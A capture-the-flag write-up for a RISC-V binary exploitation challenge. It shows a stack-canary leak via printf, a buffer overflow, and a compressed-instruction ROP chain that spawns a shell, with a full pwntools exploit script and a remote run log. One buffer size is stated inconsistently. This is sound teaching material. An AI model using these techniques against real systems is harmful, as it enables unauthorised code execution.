# PWN#Epsilon — RISC-V Stack Canary Leak + ROP

| | |
|---|---|
| **Category** | PWN |
| **Points** | 92 |
| **Solves** | 0 / 0 (at time of capture) |
| **Target** | `169.58.126.107:5003` |
| **Binary** | `vault` — ELF 64-bit LSB, UCB RISC-V, RVC, double-float ABI, statically linked, stripped |
| **Goal** | Get a shell on the remote host and read the flag |
| **Flag** | `CTF{d45cfcb9f43f7d1a28b2f678b0b5c72f}` |

---

## 1. Reconnaissance

```bash
$ file vault
vault: ELF 64-bit LSB executable, UCB RISC-V, RVC, double-float ABI,
       version 1 (GNU/Linux), statically linked,
       BuildID[sha1]=8853ac948f2a7eaee1cb7640e5a3b247c1141a26,
       for GNU/Linux 4.15.0, stripped
```

The binary is **statically linked and stripped** — good news (every libc gadget we need is in the binary itself, no PIE/ASLR to worry about) and bad news (no symbols, so gadgets must be located by disassembling raw bytes).

Remote service is exposed through `socat`:

```sh
# /entrypoint.sh (read post-shell)
exec socat -d -d TCP-LISTEN:5000,reuseaddr,fork \
    EXEC:"qemu-riscv64-static /challenge/vault",su=nobody
```

So each TCP connection forks a fresh `qemu-riscv64-static` running `/challenge/vault`, dropping privileges to `nobody`. The CTF infra forwards external port 5003 → container port 5000.

The interaction is a classic two-stage "name + message" prompt:

```
Enter your name: <64-byte buffer; printf("Hello, %s\n", name)>
Leave a message for the vault keeper: <read(0, buf, 0xc8); 200-byte buffer>
Message received.
```

---

## 2. Vulnerability Analysis

### Stage 1 — Canary leak via `%s`

The `name` buffer is exactly 64 bytes, but `read()` accepts more and `printf("%s", name)` walks past the null terminator. RISC-V stack-canary layout (LSB first) places a mandatory `0x00` byte at the bottom of the canary, which `printf` would normally stop at. By writing 65 bytes (64 filler + **one byte overwriting that null LSB**), we turn the canary into a printable string and leak the upper 7 bytes:

```
AAAA...AAAA B | 00 b1 b2 b3 b4 b5 b6 b7 | saved s0 | saved ra
              ^-- overwritten to 'B' (0x42), so printf walks through
```

**Caveat**: if any of `b1..b7` is itself `0x00`, the leak is truncated early. Empirically ~30–60 % of attempts fail this way; the exploit simply retries up to 40 times until 7 full bytes come back. Reconstructed canary is `b'\x00' + leaked_7_bytes`.

### Stage 2 — Buffer overflow in `read(0, buf, 0xc8)`

The "leave a message" call is `read(0, buf, 0xc8)` — 200 bytes into a 112-byte buffer. Stack frame (offsets from `buf`):

| Offset | Field |
|---|---|
| `0x00` – `0x3F` | 64 bytes of message body (filler) |
| `0x40` – `0x47` | canary |
| `0x48` – `0x4F` | saved `s0` |
| `0x50` – `0x57` | saved `ra` ← overwrite to enter ROP |
| `0x58` – `0xC7` | 112-byte ROP region |

We write the leaked canary back so the `__stack_chk_fail` at function return is bypassed, then pivot into the ROP chain.

---

## 3. ROP Gadgets

All gadgets are 16-bit RVC (compressed) sequences, found by scanning the binary for the right `c.ldsp` / `jr ra` patterns. Offsets are file vaddrs (binary is statically linked, no PIE).

| Symbol | Address | Disassembly | Purpose |
|---|---|---|---|
| `BINSH` | `0x52ab8` | `"/bin/sh"` string in `.rodata` | arg 0 |
| `EXECVE` | `0x396d4` | `li a7, 221 ; ecall` | `execve` syscall stub (RISC-V syscall 221) |
| `G_a1` | `0x19cbc` | `c.ldsp a1, 8(sp) ; … ; c.ldsp ra, 0x18(sp) ; addi16sp 0x20 ; jr ra` | sets `a1`, pivots to next gadget |
| `G_a2` | `0x38884` | `c.ldsp a2, 8(sp) ; c.ldsp ra, 0x18(sp) ; c.add a0, a2 ; addi16sp 0x20 ; jr ra` | sets `a2`, pivots |
| `G_a0` | `0x4df9e` | `c.ldsp a0, 0x18(sp) ; c.ldsp ra, 0x28(sp) ; addi16sp 0x30 ; jr ra` | sets `a0`, pivots to syscall |

### Why three gadgets?

`execve("/bin/sh", NULL, NULL)` needs `a0 = ptr`, `a1 = 0`, `a2 = 0`, `a7 = 221`. Each gadget loads **one** argument register from a slot in the stack frame and then re-pivots `ra` to the next gadget. The three are chained so each one's `addi16sp` slides `sp` forward by exactly the right amount to expose the next gadget's input slots.

### Stack-frame layout of the ROP region (offsets relative to the 112-byte region starting at stack offset `0x58`)

```
0x00 – 0x07  junk
0x08 – 0x0F  p64(0)        ← consumed by G_a1 → a1 = 0
0x10 – 0x17  junk
0x18 – 0x1F  p64(G_a2)     ← consumed by G_a1 → ra = G_a2
0x20 – 0x27  junk
0x28 – 0x2F  p64(0)        ← consumed by G_a2 → a2 = 0
0x30 – 0x37  junk
0x38 – 0x3F  p64(G_a0)     ← consumed by G_a2 → ra = G_a0
0x40 – 0x57  junk (G_a0 reads from sp+0x18, sp+0x28 after its addi16sp 0x30)
0x58 – 0x5F  p64(BINSH)    ← consumed by G_a0 → a0 = "/bin/sh"
0x60 – 0x67  junk
0x68 – 0x6F  p64(EXECVE)   ← consumed by G_a0 → ra = EXECVE
```

### Execution trace

1. Function returns into **`G_a1`**. It loads `a1 ← [sp+8] = 0`, then `ra ← [sp+0x18] = G_a2`, bumps `sp += 0x20`, and jumps `G_a2`.
2. **`G_a2`** loads `a2 ← [sp+8] = 0`, then `ra ← [sp+0x18] = G_a0`, bumps `sp += 0x20`, jumps `G_a0`. (The `c.add a0, a2` is harmless — `a0` was still 0 here.)
3. **`G_a0`** loads `a0 ← [sp+0x18] = BINSH`, then `ra ← [sp+0x28] = EXECVE`, bumps `sp += 0x30`, jumps `EXECVE`.
4. **`EXECVE`** does `li a7, 221 ; ecall` → `execve("/bin/sh", 0, 0)` → shell.

---

## 4. Exploit

```python
#!/usr/bin/env python3
import sys
from pwn import *

context.arch    = 'riscv64'
context.endian  = 'little'
context.log_level = 'info'

BINSH   = 0x52ab8   # "/bin/sh"
EXECVE  = 0x396d4   # li a7,221 ; ecall
G_a1    = 0x19cbc   # c.ldsp a1,8(sp); c.ldsp ra,0x18(sp); addi16sp 0x20; jr ra
G_a2    = 0x38884   # c.ldsp a2,8(sp); c.ldsp ra,0x18(sp); c.add a0,a2; addi16sp 0x20; jr ra
G_a0    = 0x4df9e   # c.ldsp a0,0x18(sp); c.ldsp ra,0x28(sp); addi16sp 0x30; jr ra

def start():
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        return remote('169.58.126.107', 5003)
    return process(['qemu-riscv64', './vault'])

def leak_canary():
    # A random null inside canary bytes [1..7] truncates the %s leak.
    for attempt in range(40):
        io = start()
        io.recvuntil(b'Enter your name: ')
        io.send(b'A'*64 + b'B')              # 65 bytes: clobber canary LSB
        data  = io.recvuntil(b'Leave', drop=True)
        after = data.split(b'Hello, ', 1)[1]
        leaked = after[65:65+7]
        if len(leaked) == 7:
            canary = b'\x00' + leaked         # null LSB + 7 leaked bytes
            return io, canary
        log.info('attempt %d: short leak (null in canary), retrying' % attempt)
        io.close()
    raise RuntimeError('could not leak full canary')

io, canary = leak_canary()
log.success('canary = ' + hex(u64(canary)))

# ---- stage 2: overflow in read(0, buf, 0xc8) ----
rop = {
    0x08: p64(0),       # G_a1 -> a1 = 0
    0x18: p64(G_a2),    # G_a1 -> ra
    0x28: p64(0),       # G_a2 -> a2 = 0
    0x38: p64(G_a0),    # G_a2 -> ra
    0x58: p64(BINSH),   # G_a0 -> a0 = "/bin/sh"
    0x68: p64(EXECVE),  # G_a0 -> ra = execve stub
}
rop_region = bytearray(b'C' * 0x70)         # 112 bytes (offsets 88..199)
for off, val in rop.items():
    rop_region[off:off+8] = val

payload  = b'A'*64                           # filler up to canary
payload += canary                            # [64:72]
payload += b'S'*8                            # [72:80] saved s0 (junk)
payload += p64(G_a1)                         # [80:88] return address -> first gadget
payload += bytes(rop_region)                 # [88:200]
assert len(payload) == 200, len(payload)

io.recvuntil(b'vault keeper: ')
io.send(payload)

io.sendline(b'cat /flag/flag.txt')
io.interactive()
```

### Run

```bash
$ pip install pwntools        # if missing
$ python3 exploit.py remote
[+] Opening connection to 169.58.126.107 on port 5003: Done
[+] canary = 0x61f5ce074a1af200
[*] Switching to interactive mode
$ cat /flag/flag.txt
CTF{d45cfcb9f43f7d1a28b2f678b0b5c72f}
$
```

---

## 5. Flag

```
CTF{d45cfcb9f43f7d1a28b2f678b0b5c72f}
```

---

## 6. Notes & Lessons

* **Static + stripped ≠ hard.** On RISC-V (and any static binary), the entire syscall surface is reachable from inside the binary; you don't need a libc leak. A single `li a7, <n> ; ecall` stub plus a few stack-spilling gadgets is enough to call any syscall.
* **RVC gadget hunting is forgiving.** Compressed 16-bit instructions mean there are *lots* of half-aligned `c.ldsp` / `jr ra` sequences to choose from. The trick is finding ones whose `addi16sp` increment matches the slots you actually need to fill — picking three different gadgets with three different `addi16sp` values (`0x20`, `0x20`, `0x30`) lines up `a0/a1/a2` and the final `ra` cleanly.
* **RISC-V canary LSB is your friend.** Like x86-64, RISC-V stack cookies terminate with `0x00`, which `%s` honors. One byte of overwrite turns the canary into a printable string and leaks the upper 7 bytes. The catch on this challenge: any of those 7 bytes may also be `0x00`, so the leak is probabilistic — just retry until you get all 7.
* **`su=nobody` ≠ dead end.** `socat` drops to `nobody` (uid 65534), but `/flag/flag.txt` is mode `444` and world-readable, so once you have any shell the flag is one `cat` away.
* **`qemu-riscv64-static` ≠ ASLR.** The binary is mapped at a fixed address inside QEMU user-mode, so the file vaddr of `"/bin/sh"` and the gadgets is identical across every connection — no need to leak a base address.
